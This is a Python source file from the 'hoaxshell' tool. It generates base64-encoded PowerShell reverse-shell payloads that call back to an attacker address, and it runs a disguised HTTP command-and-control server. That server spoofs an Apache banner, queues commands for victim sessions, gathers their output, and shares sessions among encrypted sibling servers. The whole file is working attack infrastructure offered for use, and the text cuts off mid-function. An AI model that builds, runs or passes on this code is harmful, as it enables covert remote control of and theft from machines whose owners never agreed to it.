#!/bin/python3
#
# Author: Panagiotis Chartas (t3l3machus)
# https://github.com/t3l3machus

import ssl, sys, argparse, base64, re, os, socket
import netifaces as ni
from http.server import HTTPServer, BaseHTTPRequestHandler
from warnings import filterwarnings
from datetime import date, datetime
from IPython.display import display
from threading import Thread, Event, BoundedSemaphore
from time import sleep
from ipaddress import ip_address
from subprocess import check_output
from string import ascii_uppercase, ascii_lowercase
from pyperclip import copy as copy2cb
from uuid import uuid4
from ast import literal_eval
from .common import *
from .settings import Threading_params, Core_server_settings, Sessions_manager_settings

filterwarnings("ignore", category = DeprecationWarning)


# Parameter parsing
cwd = os.path.dirname(os.path.abspath(__file__))
bind_address = '0.0.0.0'
bind_port = 65002
_header = 'Authorization'
default_frequency = 0.8
certfile, keyfile = False, False


# Check if both cert and key files were provided
if (certfile and not keyfile) or (keyfile and not certfile):
	exit_with_msg('Failed to start over https. Missing key or cert file (check -h for more details).')

ssl_support = True if certfile and keyfile else False

# -------------- General Functions -------------- #



# ------------------ Settings ------------------ #
# ~ prompt = "hoaxshell > "
# ~ stop_event = Event()
# ~ t_process = None


# ~ def rst_prompt(force_rst = False, prompt = prompt, prefix = '\r'):

	# ~ if Hoaxshell.rst_promt_required or force_rst:
		# ~ sys.stdout.write(prefix + prompt + readline.get_line_buffer())
		# ~ Hoaxshell.rst_promt_required = False



class Payload_generator:

	def encodePayload(self, payload):
		enc_payload = "powershell -e " + base64.b64encode(payload.encode('utf16')[2:]).decode()
		return enc_payload
		# ~ print(f'{PLOAD}{enc_payload}{END}')


	def args_to_dict(self, args_list):
		
		try:
			args_dict = {}
			
			for arg in args_list:
				tmp = arg.split("=")
				args_dict[tmp[0].lower()] = tmp[1]
			
			return args_dict
		
		except:
			return None
	
	
	
	def generate_payload(self, args_list):
		
		# ~ try:

		args_dict = self.args_to_dict(args_list)
		arguments = args_dict.keys()
		
		if not args_dict:
			print('Error parsing arguments. Check your input and try again.')
			return 1
		
		global bind_port, _header, default_frequency
		
		boolean_args = {
			'raw' : False,
			'constraint_mode' : False,
			'invoke_restmethod' : False,
			'trusted_domain' : False
		}
		
		''' Parse OS '''
		if 'os' in arguments:
			if args_dict['os'].lower() in ['windows', 'linux', 'macos']:
				os_type = args_dict['os']
			
			else:
				print('Unsupported OS type.')
				return 1				
			
		else:
			print('Required argument OS not provided.')
			return 1	
	
		
		''' Parse LHOST '''
		if 'lhost' in arguments:
			
			try:
				lhost = str(ip_address(args_dict['lhost']))
				
			except ValueError:
				
				try:
					lhost = ni.ifaddresses(args_dict['lhost'])[ni.AF_INET][0]['addr']
					
				except:
					print('Error parsing LHOST. Check your input and try again.')
					return 1
					
		else:
			print('Required argument LHOST not provided.')
			return 1			
		
		

		''' Parse FREQUENCY'''
		if 'frequency' in arguments:
			
			if isinstance(args_dict['frequency'], float) or isinstance(args_dict['frequency'], int):
				frequency = args_dict['frequency']
				
			else:
				print('Error parsing FREQUENCY. Invalid value type.')
				return 1				
				
		else:	
			frequency = default_frequency
		
		
		
		''' Parse HEADER '''
		if 'header' in arguments:
			
			# Check provided header name for illegal chars	
			valid = ascii_uppercase + ascii_lowercase + '-_'
			
			for char in args_dict['header']:
				if char not in valid:
					print(f'HEADER value includes illegal character "{char}".')
					return 1
			
			_header = args_dict['header']



		''' Parse EXEC_OUTFILE '''
		support = ['windows']
		
		if args_dict['os'] in support:
			
			if (args_dict['os'] == 'windows') and ('exec_outfile' in arguments):
				exec_outfile = args_dict['exec_outfile']
				
			else:
				exec_outfile = False
		else:
			print(f'Ignoring argument "exec_outfile" (not supported for {args_dict["os"]} payloads)')



		''' Parse BOOLEAN '''
		
		for item in boolean_args.keys():
			if (item in arguments) and (os_type == 'windows'):
				
				if args_dict[item] == 'true':
					boolean_args[item] = True
					
				elif args_dict[item] == 'false':
					boolean_args[item] = False
					
				else:
					print(f'Invalid value for {boolean_args[item]} (type: BOOLEAN).')
			# ~ else:
				# ~ boolean_args[item] = False
		# ~ else:
			# ~ print(f'Ignoring argument "{item}" (not supported for linux payloads)')		


		''' Parse RAW '''	
		if 'raw' in arguments:
			raw_payload = True if args_dict['raw'].lower() == 'true' else False
		else:
			raw_payload = False
			
		if (os_type == 'linux'):
			boolean_args['constraint_mode'] = True
			boolean_args['trusted_domain'] = True
			exec_outfile = False
			raw_payload = True

		lhost = f'{lhost}:{bind_port}'

		# Create session unique id
		verify = str(uuid4())[0:8]
		get_cmd = str(uuid4())[0:8]
		post_res = str(uuid4())[0:8]
		hid = str(uuid4()).split("-")
		header_id = f'X-{hid[0][0:4]}-{hid[1]}' if not _header else _header
		session_unique_id = '-'.join([verify, get_cmd, post_res])

		print(f'Generating reverse shell payload...')
								  
		if not ssl_support:
			source = open(f'{cwd}/payload_templates/{os_type}/http_payload', 'r') if not exec_outfile else open(f'{cwd}/payload_templates/{os_type}/http_payload_outfile', 'r')
		
		elif ssl_support and boolean_args['trusted_domain']:
			source = open(f'{cwd}/payload_templates/{os_type}/https_payload_trusted', 'r') if not exec_outfile else open(f'{cwd}/payload_templates/{os_type}/https_payload_trusted_outfile', 'r')
			
		elif ssl_support and not boolean_args['trusted_domain']:
			source = open(f'{cwd}/payload_templates/{os_type}/https_payload', 'r') if not exec_outfile else open(f'{cwd}/payload_templates/{os_type}/https_payload_outfile', 'r')
		
		payload = source.read().strip()
		source.close()
		
		payload = payload.replace('*SERVERIP*', lhost).replace('*SESSIONID*', session_unique_id).replace('*FREQ*', str(
			frequency)).replace('*VERIFY*', verify).replace('*GETCMD*', get_cmd).replace('*POSTRES*', post_res).replace('*HOAXID*', header_id)
		
		if boolean_args['invoke_restmethod']:
			payload = payload.replace("Invoke-WebRequest", "Invoke-RestMethod").replace(".Content", "")		

		if exec_outfile:
			payload = payload.replace("*OUTFILE*", args_dict['exec_outfile'])
		
		if boolean_args['constraint_mode']:
			payload = payload.replace("([System.Text.Encoding]::UTF8.GetBytes($e+$r) -join ' ')", "($e+$r)")
		
		Sessions_manager.legit_session_ids[session_unique_id]={
			'OS Type' : args_dict['os'].capitalize(),
			'constraint_mode' : boolean_args['constraint_mode'],
			'frequency' : frequency
		}
		
		if not raw_payload:
			payload = self.encodePayload(payload)
		
		print(f'{PLOAD}{payload}{END}')
		copy2cb(payload)
		print(f'{ORANGE}Copied to clipboard!{END}')
		# ~ except Exception as e:
			# ~ print(f'ERROR + {str(e)}')



	def obfuscate(self, payload):
		
		pass




class Sessions_manager:
	
	active_sessions = {}
	legit_session_ids = {}
	
	def list_sessions(self):
		
		if len(self.active_sessions.keys()):
			
			print('\r')
			
			# ~ for session in self.active_sessions.keys():
				# ~ alias = self.active_sessions[session]['alias']
				# ~ session_id = alias if alias is not None else session
				# ~ print(f'{session_id}  {self.active_sessions[session]["ip"]}  {self.active_sessions[session]["OS Type"]}  {self.active_sessions[session]["Owner"]}  {self.active_sessions[session]["Status"]}')

			table = self.sessions_dict_to_list()
			print_table(table, ['Session ID', 'IP Address', 'OS Type', 'Owner', 'Status'])
			
			print('\r')
		
		else:
			print(f'No active sessions.')



	def sessions_dict_to_list(self):
		
		sessions_list = []
		
		for session_id in self.active_sessions.keys():
			
			tmp = self.active_sessions[session_id]
			tmp['Session ID'] = session_id
			sessions_list.append(tmp)
		
		return sessions_list
		


	def return_session_owner_id(self, session_id):
		
		if session_id in Sessions_manager.active_sessions.keys():
			return Sessions_manager.active_sessions[session_id]['Owner']
		
		else:
			return None
			


	def alias_to_session_id(self, sid):
		
		for session_id in Sessions_manager.active_sessions.keys():
			if Sessions_manager.active_sessions[session_id]['aliased']:
				if Sessions_manager.active_sessions[session_id]['alias'] == sid:
					return session_id
		
		return sid



	def kill_session(self, session_id):
		
		if session_id in self.active_sessions.keys():
			Hoaxshell.dropSession(session_id)
			sleep(default_frequency)
			self.active_sessions.pop(session_id, None)
			self.legit_session_ids.pop(session_id, None)
			session_id_components = session_id.split('-')
			Hoaxshell.verify.remove(session_id_components[0])
			Hoaxshell.get_cmd.remove(session_id_components[1])
			Hoaxshell.post_res.remove(session_id_components[2])
			print('Session terminated.')
			Core_server.announce_session_termination({'session_id' : session_id})
			
		else:
			print('Session invalid.')


# -------------- Hoaxshell Server -------------- #
class Hoaxshell(BaseHTTPRequestHandler):
	
	global _header, default_frequency
	header_id = _header
	server_unique_id = None
	rst_promt_required = False
	prompt_ready = True
	command_pool = {}
	execution_verified = False
	last_received = ''
	verify = []
	get_cmd = []
	post_res = []
	server_version = 'Apache/2.4.1' #if not server_version else server_version
	init_dir = None

	
	def command_handler(self, command, session_id):
		
		if len(Sessions_manager.active_sessions.keys()):
			
			if command == "pwd": 
				command = "split-path $pwd'\\0x00'"
				
			Hoaxshell.command_pool[session_id].append(command + ";pwd")

		else:
			print(f'\r[{INFO}] No active session.')		



	def search_output_for_signature(self, output):
		
		try:
			sibling_server_id = re.findall("{[a-zA-Z0-9]{32}}", output)[-1].strip("{}")
		
		except:
			sibling_server_id = None
		
		return sibling_server_id


	
	def cmd_output_interpreter(self, output, constraint_mode = False):
		
		# ~ global prompt
		
		try:
				
			if constraint_mode:
				output = output.decode('utf-8', 'ignore')
				
			else:			
				
				bin_output = output.decode('utf-8').split(' ')
				to_b_numbers = [ int(n) for n in bin_output ]
				b_array = bytearray(to_b_numbers)
				output = b_array.decode('utf-8', 'ignore')

			# Check if command was issued by a sibling server
			sibling_signature = self.search_output_for_signature(output)
			
			if sibling_signature:
				output = output.replace('{' + sibling_signature + '}', '')
								
			tmp = output.rsplit("Path", 1)
			output = tmp[0]
			junk = True if re.search("Provider     : Microsoft.PowerShell.Core", output) else False
			output = output.rsplit("Drive", 1)[0] if junk else output
			
			# ~ if Hoaxshell.init_dir == None:
				# ~ p = tmp[-1].strip().rsplit("\n")[-1]
				# ~ p = p.replace(":", "", 1).strip() if p.count(":") > 1 else p
				# ~ Hoaxshell.init_dir = p
										
			# ~ if not exec_outfile:						
				# ~ p = tmp[-1].strip().rsplit("\n")[-1]
				# ~ p = p.replace(":", "", 1).strip() if p.count(":") > 1 else p
				
			# ~ else:
				# ~ p = Hoaxshell.init_dir
				
			# ~ prompt = f"PS {p} > "

		except UnicodeDecodeError:
			print(f'[{WARN}] Decoding data to UTF-8 failed. Printing raw data.')

		if isinstance(output, bytes):
			output = str(output)

		else:
			output = output.strip() + '\n' if output.strip() != '' else output.strip()
			return output if not sibling_signature else [sibling_signature, output]



	# ~ def forward_cmd_ouput_to_sibling(self):
		
		# ~ #print(f'sending: {sibling_id}, {data_dict}, {capsule}')
		
		# ~ # AES KEY is the server's ID and IV is the 16 first bytes of the sibling's ID
		# ~ encapsulated_data = str(self.encapsulate_dict(data_dict, capsule))
		# ~ encapsulated_data_encrypted = encrypt_msg(self.SERVER_UNIQUE_ID.encode('utf-8'), encapsulated_data, sibling_id[0:16].encode('utf-8'))
		# ~ encapsulated_response_data_encrypted = self.send_receive_one(encapsulated_data_encrypted, self.sibling_servers[sibling_id]['Server IP'], self.sibling_servers[sibling_id]['Server Port'], encode_msg = False)
		# ~ encapsulated_response_data_decrypted = decrypt_msg(sibling_id.encode('utf-8'), encapsulated_response_data_encrypted, self.SERVER_UNIQUE_ID[0:16].encode('utf-8'))
		# ~ #print(f'Received: {encapsulated_response_data_decrypted}')
		# ~ decapsulated_response_data = self.decapsulate_dict(encapsulated_response_data_decrypted) # returns [capsule, received_data]
		# ~ return decapsulated_response_data



	def do_GET(self):

		timestamp = int(datetime.now().timestamp())		

		# Identify session
		# ~ try:
		if not Hoaxshell.header_id:
			header_id_extract = [header.replace("X-", "") for header in self.headers.keys() if re.match("X-[a-z0-9]{4}-[a-z0-9]{4}", header)]
			Hoaxshell.header_id = f'X-{header_id_extract[0]}'
		# ~ else:
			# ~ _header = _header
		try:
			session_id = self.headers.get(Hoaxshell.header_id)
		except:
			session_id = None
			
		# ~ except:
			# ~ print('BOOM')
			# ~ pass
		
		
		#if session_id and (session_id not in Sessions_manager.active_sessions.keys()):
		if session_id and (session_id not in Sessions_manager.active_sessions.keys()):
			if session_id in Sessions_manager.legit_session_ids.keys():
				h = session_id.split('-')
				Hoaxshell.verify.append(h[0])
				Hoaxshell.get_cmd.append(h[1])
				Hoaxshell.post_res.append(h[2])
				Sessions_manager.active_sessions[session_id] = {
					'IP Address' : self.client_address[0], 
					'Port' : self.client_address[1],
					'execution_verified' : False,
					'Status' : f'{GREEN}Active{END}',
					'last_received' : timestamp,
					'OS Type' : Sessions_manager.legit_session_ids[session_id]['OS Type'],
					'frequency' : Sessions_manager.legit_session_ids[session_id]['frequency'],
					'Owner' : Hoaxshell.server_unique_id, 
					'aliased' : False, 
					'alias' : None
				}
				
				Hoaxshell.command_pool[session_id] = []
				return
				# ~ Hoaxshell.rst_promt_required = True
				
		elif session_id and (session_id in Sessions_manager.active_sessions.keys()):
			Sessions_manager.active_sessions[session_id]['last_received'] = timestamp	
				
		
		elif not session_id:
			print('ommited') #delete
			return
		# ~ self.server_version = Hoaxshell.server_version
		self.sys_version = ""
		session_id = self.headers.get(Hoaxshell.header_id)
		legit = True if session_id in Sessions_manager.legit_session_ids.keys() else False

		# Verify execution
		if (self.path.strip("/") in Hoaxshell.verify) and legit:
			
			if Sessions_manager.active_sessions[session_id]['execution_verified']:
				print('received request from already established session') #delete
				return
			
			self.send_response(200)
			self.send_header('Content-type', 'text/javascript; charset=UTF-8')
			self.send_header('Access-Control-Allow-Origin', '*')
			self.end_headers()
			self.wfile.write(bytes('OK', "utf-8"))
			print(f'\r[{GREEN}Shell{END}] {BOLD}New session established! {END}[{ORANGE}{self.client_address[0]}{END}]')
			Main_prompt.rst_prompt(force_rst = True)

			try:
				
				Thread(target = self.monitor_shell_state, args = (session_id,), daemon = True).start()
				
			except:
				print('pulse check function failed') #delete
				
			new_session_data = Sessions_manager.active_sessions[session_id].copy()
			new_session_data['session_id'] = session_id
			Core_server.announce_new_session(new_session_data)
			del new_session_data
			#print(f'\r[{GREEN}Shell{END}] {BOLD}Stabilizing command prompt...{END}', end = '\n\n') #end = ''
			#print(f'\r[{IMPORTANT}] You can\'t change dir while utilizing --exec-outfile (-x) option. Your commands must include absolute paths to files, etc.') if exec_outfile else chill()
			# ~ Hoaxshell.prompt_ready = False
			# ~ Hoaxshell.command_pool[session_id].append(f"echo `r;pwd")
			# ~ Hoaxshell.rst_promt_required = True
			#print(active_sessions)

		# Grab cmd
		elif self.path.strip("/") in Hoaxshell.get_cmd and legit:

			self.send_response(200)
			self.send_header('Content-type', 'text/javascript; charset=UTF-8')
			self.send_header('Access-Control-Allow-Origin', '*')
			self.end_headers()
			
			if len(Hoaxshell.command_pool[session_id]):
				cmd = Hoaxshell.command_pool[session_id].pop(0)
				self.wfile.write(bytes(cmd, 'utf-8'))

			else:
				self.wfile.write(bytes('None', 'utf-8'))

			Hoaxshell.last_received = timestamp
			return


		else:
			self.send_response(200)
			self.end_headers()
			self.wfile.write(b'Move on mate.')
			pass



	def do_POST(self):
		
		# ~ global prompt
		timestamp = int(datetime.now().timestamp())
		session_id = self.headers.get(Hoaxshell.header_id)
		legit = True if (session_id in Sessions_manager.legit_session_ids.keys()) else False
		
		if legit:		
				
			Sessions_manager.active_sessions[session_id]['last_received'] = timestamp
			self.server_version = Hoaxshell.server_version
			self.sys_version = ""				

			# cmd output
			if self.path.strip("/") in Hoaxshell.post_res:

				try:
					self.send_response(200)
					self.send_header('Access-Control-Allow-Origin', '*')
					self.send_header('Content-Type', 'text/plain')
					self.end_headers()
					self.wfile.write(b'OK')
					content_len = int(self.headers.get('Content-Length'))
					output = self.rfile.read(content_len)
					#output = Hoaxshell.cmd_output_interpreter(self, output, constraint_mode = Sessions_manager.legit_session_ids[session_id]['constraint_mode'])
					output = self.cmd_output_interpreter(output, constraint_mode = Sessions_manager.legit_session_ids[session_id]['constraint_mode'])
					
					if isinstance(output, str):				
						print(f'\r{GREEN}{output}{END}')
						Main_prompt.rst_prompt(force_rst = True)
					
					elif isinstance(output, list):
						Core_server.send_receive_one_encrypted(output[0], f'{output[1]}', 'command_output')
						del output
									
						
				except ConnectionResetError:
					print(f'[{FAILED}] There was an error reading the response, most likely because of the size (Content-Length: {self.headers.get("Content-Length")}). Try redirecting the command\'s output to a file and transfering it to your machine.')


		else:
			self.send_response(200)
			self.end_headers()
			self.wfile.write(b'Move on mate.')
			pass



	def do_OPTIONS(self):

		self.server_version = Hoaxshell.server_version
		self.sys_version = ""
		self.send_response(200)
		self.send_header('Access-Control-Allow-Origin', self.headers["Origin"])
		self.send_header('Vary', "Origin")
		self.send_header('Access-Control-Allow-Credentials', 'true')
		self.send_header('Access-Control-Allow-Headers', Hoaxshell.header_id)
		self.end_headers()
		self.wfile.write(b'OK')


	def log_message(self, format, *args):
		return


	@staticmethod
	def dropSession(session_id):
		# ~ print(f'\r[{WARN}] Closing session elegantly...')
		
		# ~ if not exec_outfile:
		Hoaxshell.command_pool[session_id].append('exit')
		# ~ else:
			# ~ Hoaxshell.command_pool[session_id].append(f'del {exec_outfile};exit')	
			
		
		# ~ print(f'[{WARN}] Session terminated.')
		# ~ stop_event.set()
		# ~ sys.exit(0)


	@staticmethod
	def terminate():
			
		sessions = Sessions_manager.active_sessions.keys()
	
		if len(sessions):
			
			print(f'\r[{INFO}] Terminating active sessions - DO NOT INTERRUPT...')		
			
			for session_id in sessions:
				Hoaxshell.dropSession(session_id)				
				Core_server.announce_session_termination({'session_id' : session_id})
			
			sleep(default_frequency + 2.0)
			print(f'\r[{INFO}] Sessions terminated.')
			
		else:
			# ~ stop_event.set()
			sys.exit(0)



	def monitor_shell_state(self, session_id):

		Threading_params.thread_limiter.acquire()
		
		while session_id in Sessions_manager.active_sessions.keys():

			timestamp = int(datetime.now().timestamp())
			tlimit = (default_frequency + Sessions_manager_settings.shell_state_change_after)

			if (abs(Sessions_manager.active_sessions[session_id]['last_received'] - timestamp) > tlimit):
				Sessions_manager.active_sessions[session_id]['Status'] = 'Undefined'

			else:
				Sessions_manager.active_sessions[session_id]['Status'] = 'Active'
				
			sleep(5)
			
		else:
			Threading_params.thread_limiter.release()



def initiate_hoax_server():

	try:
		
		global bind_port, bind_address
			
		# Start http server
		try:
			httpd = HTTPServer((bind_address, bind_port), Hoaxshell)

		except OSError:
			exit(f'\n[{FAILED}] {BOLD}Port {bind_port} seems to already be in use.{END}\n')
		
		except:
			exit(f'\n[{FAILED}] HTTP server failed to start (Unknown error occurred).\n')

		if ssl_support:
			httpd.socket = ssl.wrap_socket (
				httpd.socket,
				keyfile = keyfile ,
				certfile = certfile ,
				server_side = True,
				ssl_version=ssl.PROTOCOL_TLS
			)


		Hoaxshell_server = Thread(target = httpd.serve_forever, args = ())
		Hoaxshell_server.daemon = True
		Hoaxshell_server.start()
		print(f'[{INFO}] Hoaxshell engine listening on {ORANGE}{bind_address}{END}:{ORANGE}{bind_port}{END}\n')

		
		# Generate payload



		# ~ print(f'[{INFO}] Type "help" to get a list of the available prompt commands.')
		# ~ print(f'[{INFO}] Https Server started on port {bind_port}.') if ssl_support else print(f'[{INFO}] Http Server started on port {bind_port}.')
		# ~ print(f'[{IMPORTANT}] {BOLD}Awaiting payload execution to initiate shell session...{END}')



		# ~ # Command prompt
		# ~ while True:

			# ~ if Hoaxshell.prompt_ready:

				# ~ user_input = input(prompt).strip()

				# ~ if user_input.lower() in ['clear']:
					# ~ system('clear')

				# ~ elif user_input.lower() in ['payload']:
					# ~ encodePayload(payload)

				# ~ elif user_input.lower() in ['rawpayload']:
					# ~ print(f'{PLOAD}{payload}{END}')

				# ~ elif user_input.lower() in ['exit', 'quit', 'q']:
					# ~ Hoaxshell.terminate()

				# ~ elif user_input == '':
					# ~ rst_prompt(force_rst = True, prompt = '\r')

				# ~ else:

					# ~ if Hoaxshell.execution_verified and not Hoaxshell.command_pool:
						
						# ~ if user_input == "pwd": user_input = "split-path $pwd'\\0x00'"
							
						# ~ Hoaxshell.command_pool.append(user_input + f";pwd")
						# ~ Hoaxshell.prompt_ready = False

					# ~ elif Hoaxshell.execution_verified and Hoaxshell.command_pool:
						# ~ pass

					# ~ else:
						# ~ print(f'\r[{INFO}] No active session.')



	except KeyboardInterrupt:
		Hoaxshell.terminate()





class Core_server:
	
	acknowledged_servers = []
	sibling_servers = {}
	CLIENT_BUFFER_SIZE = 4096
	SERVER_UNIQUE_ID = str(uuid4()).replace('-', '')
	HOSTNAME = socket.gethostname()
	bind_port = 65001
	bind_address = '0.0.0.0'
	listen = True
	ping_sibling_servers = False
	CONNECT_SYN = b'\x4f\x86\x2f\x7b'
	CONNECT_ACK = b'\x5b\x2e\x42\x6d'
	CONNECT_DENY = b'\x3c\xc3\x86\xde'
		
	# Threading
	# ~ max_threads = 100
	# ~ thread_limiter = BoundedSemaphore(max_threads)
	
			
	@staticmethod	
	def return_server_uniq_id():
		return Core_server.SERVER_UNIQUE_ID



	def sock_handler(self, conn, address):
		
		Threading_params.thread_limiter.acquire()
		raw_data = conn.recv(4096) 

		# There are 3 defined byte sequences for recognizing a sibling server's request to connect (something like a TCP handshake but significantly more stupid)
		# Check if raw_data is a connection request
		if raw_data in [self.CONNECT_SYN, self.CONNECT_ACK, self.CONNECT_DENY]:
				
			if raw_data == self.CONNECT_SYN:
				
				# ~ response_choice = input(f"[{INFO}] Received request to connect from {ORANGE}{address}{END}. If you wish to connect type {ORANGE}{self.SERVER_UNIQUE_ID[0:6]}{END} and press ENTER: ")
				
				if True: #response_choice == self.SERVER_UNIQUE_ID[0:6]:
					Main_prompt.set_main_prompt = False
					self.acknowledged_servers.append(address[0])
					conn.send(self.CONNECT_ACK) #.encode('utf-8', 'ignore')
					
				else:
					conn.send(self.CONNECT_DENY)
				
			return
				
		
		# If the sender's IP address is in the list of acknowledged for connection servers and the msg is a valid UUID4, then establish connection
		if address[0] in self.acknowledged_servers:
			
			str_data = raw_data.decode('utf-8', 'ignore').strip()
			
			# Try to interpret the clear text data
			try:
				tmp = str_data.split(':')
				sibling_id = tmp[0]
				sibling_server_port = tmp[1]
				sibling_server_hostname = tmp[2]
				
			except:
				sibling_id = None
			
			
			if is_valid_uuid(sibling_id): #and (address[0] in self.acknowledged_servers)
				
				self.sibling_servers[sibling_id] = {'Hostname' : sibling_server_hostname, 'Server IP' : address[0], 'Server Port' : int(sibling_server_port)}
				conn.send(f'{self.SERVER_UNIQUE_ID}:{self.HOSTNAME}'.encode("utf-8"))
				self.acknowledged_servers.remove(address[0])
				
				# Synchronize all servers
				self.synchronize_sibling_servers()
				return
			
		
		# Check if connection is coming from an acknowledged sibling server			
		server_is_sibling = sibling_id = False
		
		if len(self.sibling_servers.keys()):
			server_is_sibling = sibling_id = self.server_is_sibling(address[0])


		# If the packet is coming from a sibling then it's encrypted and "encapsulated"
		if server_is_sibling:
			# ~ try: 
			# AES KEY is the sender sibling server's ID and IV is the 16 first bytes of the (local host) server's ID		
			decrypted_data = self.decrypt_encapsulated_msg(sibling_id, raw_data) # returns [capsule, received_data]

			if decrypted_data[0] == 'synchronize_sibling_servers_table':

				self.update_siblings_data_table(decrypted_data[1])
				
				# Return local sibling servers data
				sibling_servers_data_local = str(self.encapsulate_dict(self.sibling_servers, decrypted_data[0]))
				encrypted_siblings_data = encrypt_msg(self.SERVER_UNIQUE_ID.encode('utf-8'), sibling_servers_data_local, sibling_id[0:16].encode('utf-8'))
				conn.send(encrypted_siblings_data)
				
				# ~ Main_prompt.rst_prompt(force_rst = True)
			
			
			
			
			elif decrypted_data[0] == 'synchronize_sibling_servers_shells':
				
				self.update_shell_sessions(decrypted_data[1])
				
				# Return local sibling servers data
				sibling_servers_shells = str(self.encapsulate_dict(Sessions_manager.active_sessions, decrypted_data[0]))
				encrypted_siblings_data = encrypt_msg(self.SERVER_UNIQUE_ID.encode('utf-8'), sibling_servers_shells, sibling_id[0:16].encode('utf-8'))
				conn.send(encrypted_siblings_data)
				
				# ~ Main_prompt.rst_prompt(force_rst = True)
			
			
			
			
			elif decrypted_data[0] == 'exec_command':
									
				data = decrypted_data[1]
				
				# Check if session exists
				if data['session_id'] in Sessions_manager.active_sessions.keys():
					
					if data['command'] == "pwd": 
						data['command'] = "split-path $pwd'\\0x00'"	
											
					Hoaxshell.command_pool[data['session_id']].append(data['command'] + ";pwd")

					conn.send(self.response_ack(sibling_id))
					
					
					
					
			elif decrypted_data[0] == 'command_output':
				
				print(f'\r{GREEN}{decrypted_data[1]}{END}')					
				conn.send(self.response_ack(sibling_id))
				Main_prompt.set_main_prompt_ready()




			elif decrypted_data[0] == 'new_session':
				
				new_session_id = decrypted_data[1]['session_id']
				decrypted_data[1].pop('session_id', None)
				Sessions_manager.active_sessions[new_session_id] = decrypted_data[1]					
				print(f'\r[{GREEN}Shell{END}] {BOLD}New session established! {END}[{ORANGE}{Sessions_manager.active_sessions[new_session_id]["ip"]}{END}] (Owned by {ORANGE}{self.sibling_servers[sibling_id]["Hostname"]}{END})')
				del decrypted_data, new_session_id
				
				conn.send(self.response_ack(sibling_id))




			elif decrypted_data[0] == 'session_terminated':
				
				victim_ip = Sessions_manager.active_sessions[decrypted_data[1]['session_id']]['IP Address']
				Sessions_manager.active_sessions.pop(decrypted_data[1]['session_id'], None)					
				print(f'\r[{WARN}] Session with {ORANGE}{victim_ip}{END} (Owned by {ORANGE}{self.sibling_servers[sibling_id]["Hostname"]}{END}) terminated.')		
				del victim_ip
				
				conn.send(self.response_ack(sibling_id))




			elif decrypted_data[0] == 'server_shutdown':
				
				server_ip = self.sibling_servers[decrypted_data[1]['sibling_id']]['Server IP']
				hostname = self.sibling_servers[decrypted_data[1]['sibling_id']]['Hostname']
				self.sibling_servers.pop(decrypted_data[1]['sibling_id'], None)					
				print(f'\r[{WARN}] Sibling server {ORANGE}{server_ip}{END} (hostname: {ORANGE}{hostname}{END}) disconnected.')		
				del server_ip, hostname
				
				conn.send(self.response_ack(sibling_id))					
								


			elif decrypted_data[0] == 'are_you_alive':
				conn.send(self.response_ack(sibling_id))	
							
							
			else:
				return					
				# ~ rst_prompt(force_rst = True)
									
					
			# ~ except:
				# ~ continue				
				
		Main_prompt.rst_prompt(force_rst = True)
		Threading_params.thread_limiter.release()

		
		
	def initiate(self):
		
		try:
			server_socket = socket.socket()
			server_socket.bind((self.bind_address, self.bind_port))
					
		except OSError:
			exit_with_msg('Core server failed to establish socket.')
			
		print(f'\r[{INFO}] Core server listening on {ORANGE}{self.bind_address}{END}:{ORANGE}{self.bind_port}{END}')

		# Start listening for connections
		server_socket.listen()
		
		while self.listen:

			conn, address = server_socket.accept()  # accept new connection
			Thread(target = self.sock_handler, args = (conn, address)).start()
			
		conn.close()



	def response_ack(self, sibling_id):
		
		response_ack = str(self.encapsulate_dict({0 : 0}, 'ACKNOWLEDGED'))
		response_ack_encypted = encrypt_msg(self.SERVER_UNIQUE_ID.encode('utf-8'), response_ack, sibling_id[0:16].encode('utf-8'))
		return response_ack_encypted



	def decrypt_encapsulated_msg(self, sibling_id, raw_data):
		
		decrypted_data = decrypt_msg(sibling_id.encode('utf-8'), raw_data, self.SERVER_UNIQUE_ID[0:16].encode('utf-8'))
		decapsulated = self.decapsulate_dict(decrypted_data) # returns [capsule, received_data]
		return decapsulated



	def stop_listener(self):
		self.listen = False
		


	def list_siblings(self):
		
		if len(self.sibling_servers.keys()):
			
			print('\r')
			
			# ~ for sibling in self.sibling_servers.keys():
				# ~ print(f'{sibling}  {self.sibling_servers[sibling]["Hostname"]}  {self.sibling_servers[sibling]["Server IP"]}   {self.sibling_servers[sibling]["Server Port"]}  {self.sibling_servers[sibling]["Status"]}')

			table = self.siblings_dict_to_list()
			print_table(table, ['Sibling ID', 'Server IP', 'Hostname', 'Server Port', 'Status'])
			
			print('\r')
		
		else:
			print(f'Not connected with other servers.')
	   
	   

	@staticmethod
	def send_receive_one(msg, server_ip, server_port, encode_msg):
		
		try:
			with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as client_socket:
			# ~ client_socket.settimeout(9.0)
			# ~ client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
				client_socket.connect((str(server_ip), int(server_port)))
				msg = msg.encode('utf-8') if encode_msg else msg
				client_socket.sendall(msg)
				response_raw = client_socket.recv(Core_server.CLIENT_BUFFER_SIZE)
				client_socket.close()
				return response_raw
					
		except ConnectionRefusedError:
			return 'connection_refused'

		except socket.timeout:
			return 'timed_out'
			


	@staticmethod
	def encapsulate_dict(data, encapsulate_as):
		
		encapsulated = {}
		encapsulated[encapsulate_as] = data
		return encapsulated
		
		

	@staticmethod
	def decapsulate_dict(data):
		try:
			dict_data = literal_eval(data)
			capsule = list(dict_data.keys())[0]		
			received_data = dict_data[capsule]
			return [capsule, received_data]
			
		except:
			print(f'Failed to decapsulate data --> {data}')



	@staticmethod
	def announce_new_session(new_session_data_dict):
		
		siblings = Core_server.sibling_servers.keys()
		
		if len(siblings):
			
			for sibling_id in siblings:
				Core_server.send_receive_one_encrypted(sibling_id, new_session_data_dict, 'new_session')
		


	@staticmethod
	def announce_session_termination(terminated_session_data_dict):
		
		siblings = Core_server.sibling_servers.keys()
		
		if len(siblings):
			
			for sibling_id in siblings:
				Core_server.send_receive_one_encrypted(sibling_id, terminated_session_data_dict, 'session_terminated')



	@staticmethod
	def announce_server_shutdown():
		
		siblings = Core_server.sibling_servers.keys()
		
		if len(siblings):
			
			for sibling_id in siblings:
				Core_server.send_receive_one_encrypted(sibling_id, {'sibling_id' : Core_server.SERVER_UNIQUE_ID}, 'server_shutdown')
				
				
				
	def update_siblings_data_table(self, siblings_data):
		
		current_siblings = self.sibling_servers.keys()
		
		for sibling_id in siblings_data.keys():
			if sibling_id not in current_siblings and sibling_id != self.SERVER_UNIQUE_ID:
				self.sibling_servers[sibling_id] = siblings_data[sibling_id]
		


	def update_shell_sessions(self, shells_data):

